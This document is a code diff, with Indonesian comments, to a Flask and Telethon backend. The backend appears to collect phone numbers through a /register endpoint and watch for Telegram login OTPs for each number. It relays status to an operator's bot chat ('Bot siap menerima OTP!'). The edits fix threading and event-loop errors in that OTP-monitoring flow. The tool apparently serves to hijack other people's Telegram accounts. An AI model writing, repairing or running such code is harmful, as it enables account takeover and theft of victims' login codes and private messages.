@@ -1,4 +1,4 @@
-import os, requests, asyncio, re
+import os, requests, asyncio, re, threading
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telethon import TelegramClient, events
@@ -27,7 +27,7 @@ def normalisasi_nomor(nomor):
 def register():
     data = request.get_json()
     if not data: return jsonify({"status": "error"}), 400
-    # Jalankan handle_flow secara asinkron agar tidak memblokir server
+    # Gunakan loop baru untuk setiap request agar tidak bentrok
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     return loop.run_until_complete(handle_flow(data))
@@ -81,15 +81,14 @@ def webhook():
         action, nomor = call["data"].split("_")
         
         if action == "upd":
-            # Hapus pesan lama instan jika ada
             if user_db.get(nomor, {}).get('status_id'):
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
             
             res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
             user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
             
-            # Jalankan pemantau OTP tanpa menunggu (Background)
-            asyncio.create_task(monitor_new_otp(nomor))
+            # PERBAIKAN: Gunakan Thread agar tidak error "no running event loop"
+            threading.Thread(target=lambda: asyncio.run(monitor_new_otp(nomor))).start()
             
         elif action == "exit":
             if user_db.get(nomor, {}).get('status_id'):
@@ -120,8 +119,7 @@ async def monitor_new_otp(nomor):
                     data['status_id'] = None
                 await client.disconnect()
         
-        # Monitor selama 60 detik saja, jika lewat anggap gagal (agar tidak lalot)
-        await asyncio.sleep(60)
+        await asyncio.sleep(60) # Pantau selama 1 menit agar cepat
     finally:
         if client.is_connected(): await client.disconnect()
 
